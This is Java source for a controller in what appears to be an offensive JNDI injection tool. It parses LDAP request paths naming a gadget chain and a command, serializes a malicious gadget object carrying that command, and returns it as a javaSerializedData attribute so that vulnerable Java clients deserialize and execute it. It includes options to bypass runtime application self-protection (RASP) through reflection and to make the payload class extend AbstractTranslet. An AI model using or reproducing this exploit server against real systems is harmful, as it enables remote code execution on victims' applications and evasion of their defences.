package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.GadgetType;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedGadgetTypeException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.gadgets.ObjectPayload;
import com.nu1r.jndi.gadgets.utils.Serializer;
import com.nu1r.jndi.gadgets.utils.Util;
import com.nu1r.jndi.gadgets.utils.dirty.DirtyDataWrapper;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;

import java.io.ByteArrayOutputStream;

import static com.nu1r.jndi.gadgets.Config.Config.*;
import static org.fusesource.jansi.Ansi.ansi;

@LdapMapping(uri = {"/deserialization"})
public class SerializedDataController implements LdapController {
    private              String  gadgetType;
    private              PayloadType payloadType;
    private              String[]    params;
    public static        CommandLine cmdLine;
    private static final int         USAGE_CODE = 64;

    /**
     发送LDAP结果和重定向URL
     @param result InMemoryInterceptedSearchResult类型的结果
     @param base 基本远程参考负载字符串
     @throws Exception 异常
     */
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println(ansi().render("@|green [+]|@Send LDAP result for" + base + " with javaSerializedData attribute"));
        Entry e = new Entry(base);

        try {
            // 获取与载荷类型相关的有效负载类
            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
            // 实例化有效负载对象
            ObjectPayload                        payload      = payloadClass.newInstance();
            // 获取有效负载的对象
            Object                               object       = payload.getObject(payloadType, params);

            ByteArrayOutputStream out   = new ByteArrayOutputStream();
            byte[]                bytes = Serializer.serialize(object, out);

            // 设置Java类名属性和Java序列化数据属性，并将搜索条目发送至结果中
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaSerializedData", bytes);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Throwable er) {
            // 如果生成或序列化有效负载时出现错误，则打印错误信息和堆栈跟踪
            System.err.println("Error while generating or serializing payload");
            er.printStackTrace();
        }
    }

    /**
     处理传入的参数 base
     @param base 传入的参数
     @throws UnSupportedPayloadTypeException 不支持的载荷类型异常
     @throws IncorrectParamsException 错误的参数异常
     @throws UnSupportedGadgetTypeException 不支持的 Gadget 类型异常
     */
    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException {
        try {
            // 获取第一个斜杠的索引
            int firstIndex  = base.indexOf("/");
            // 获取第二个斜杠的索引
            int secondIndex = base.indexOf("/", firstIndex + 1);
            try {
                // 将类型值设为从第一个斜杠后的字符串到第二个斜杠前（不包括第二个斜杠）所表示的字符串
                gadgetType = base.substring(firstIndex + 1, secondIndex);
                System.out.println("[+] GaddgetType >> " + gadgetType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedGadgetTypeException("UnSupportGaddgetType >> " + base.substring(firstIndex + 1, secondIndex));
            }

            // 获取第三个斜杠的索引
            int thirdIndex = base.indexOf("/", secondIndex + 1);
            // 若第三个斜杠不存在，则把其设置成为字符串的长度
            if (thirdIndex < 0) thirdIndex = base.length();
            try {
                // 将类型值设为从第二个斜杠后的字符串到第三个斜杠前（不包括第三个斜杠）所表示的字符串转换为 PayloadType 枚举类型
                payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex));
                //System.out.println("[+] PayloadType >> " + payloadType);
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
            }

            // 如果载荷类型为 nu1r，则执行以下语句块
            if (payloadType == PayloadType.nu1r) {
                String cmd11 = Util.getCmdFromBase(base);
                if (cmd11.contains("#")) {
                    String[] cmd11s    = cmd11.split("#");
                    String[] cmd12s    = cmd11s[1].split(" ");
                    Options  options = new Options();
                    options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
                    options.addOption("o", "obscure", false, "使用反射绕过");
                    options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
                    CommandLineParser parser = new DefaultParser();

                    try {
                        cmdLine = parser.parse(options, cmd12s);
                    } catch (Exception e) {
                        System.out.println("[*] Parameter input error, please use -h for more information");
                    }

                    params = new String[]{cmd11s[0]};
                    System.out.println("[+] command：" + cmd11s[0]);

                    if (cmdLine.hasOption("obscure")) {
                        IS_OBSCURE = true;
                        System.out.println(ansi().render("@|green [+]|@ 使用反射绕过RASP "));
                    }

                    if (cmdLine.hasOption("AbstractTranslet")) {
                        IS_INHERIT_ABSTRACT_TRANSLET = true;
                        System.out.println("[+] 继承恶意类AbstractTranslet");
                    }

                    if (cmdLine.hasOption("jboss")) {
                        IS_JBOSS_OBJECT_INPUT_STREAM = true;
                    }
                } else {
                    params = new String[]{cmd11};
                    System.out.println("[+] command：" + cmd11);
                }

            }

        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
            if (e instanceof UnSupportedGadgetTypeException) throw (UnSupportedGadgetTypeException) e;

            throw new IncorrectParamsException("Incorrect params >> " + base);
        }
    }
}
